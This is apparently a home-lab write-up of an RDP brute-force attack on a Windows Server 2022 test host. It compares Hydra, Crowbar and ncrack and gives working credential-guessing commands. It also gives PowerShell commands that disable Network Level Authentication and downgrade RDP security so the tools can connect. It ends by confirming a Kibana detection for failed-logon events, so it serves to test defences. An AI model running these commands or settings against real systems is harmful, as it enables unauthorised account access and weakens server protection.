# RDP Brute-Force Attack

## Target

- **IP**: 192.168.56.104
- **Port**: 3389
- **OS**: Windows Server 2022
- **User**: Administrator

## Tool compatibility findings

Multiple brute-force tools were tested against Windows Server 2022's RDP stack.
The results are documented here because tool compatibility is a real, important
finding — not all tools work against all RDP configurations.

### Hydra (FAILED)

```bash
hydra -l Administrator -P /tmp/small.txt rdp://192.168.56.104 -t 2 -V
```

Result: `freerdp: The connection failed to establish` for every attempt.
Hydra's RDP module is explicitly marked experimental and does not handle
Windows Server 2022's RDP protocol correctly.

### Crowbar (FAILED)

```bash
crowbar -b rdp -u Administrator -C wordlist.txt -s 192.168.56.104/32
```

Result: `No results found` — same root cause as Hydra. Crowbar's RDP module
fails at the protocol handshake level before any password testing occurs.

### xfreerdp — manual connection (SUCCEEDED)

```bash
xfreerdp /v:192.168.56.104 /u:Administrator /p:'password' /cert:ignore /sec:rdp
```

Result: Connected successfully, confirmed RDP is fully functional with correct
credentials. This ruled out any configuration or network problem — the target
was correctly set up; the issue was the brute-force tools' RDP implementations.

### ncrack (SUCCEEDED)

```bash
ncrack -u Administrator -P wordlist.txt rdp://192.168.56.104
```

Result: Credentials discovered after approximately 4.5 minutes.
```
Discovered credentials for rdp on 192.168.56.104 3389/tcp:
192.168.56.104 3389/tcp rdp: 'Administrator' '[password]'
```

ncrack has a more mature RDP protocol implementation than Hydra or Crowbar and
successfully completed the authentication handshake on each attempt.

## Required Windows Server configuration

Two registry settings had to be changed before any tool could attempt authentication:

### Disable NLA (Network Level Authentication)

NLA requires a valid-looking credential handshake before the RDP session begins.
Most brute-force tools cannot complete this handshake, causing every attempt to
fail at the connection level regardless of the password.

```powershell
Set-ItemProperty `
  -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication" -Value 0
```

Verified:
```powershell
Get-ItemProperty `
  -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication"
# Should return: UserAuthentication : 0
```

### Set Security Layer to RDP

SecurityLayer 2 (SSL/TLS only) also caused connection resets before password testing.
Setting it to 0 (legacy RDP security) allowed tool compatibility.

```powershell
Set-ItemProperty `
  -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "SecurityLayer" -Value 0

Restart-Service TermService -Force
```

## Detection validation

Failed RDP logon events confirmed in Kibana Discover:
- Event ID: 4625
- Query: `event.code: "4625" and host.os.type: "windows"`
- Detection rule confirmed firing in Security > Alerts
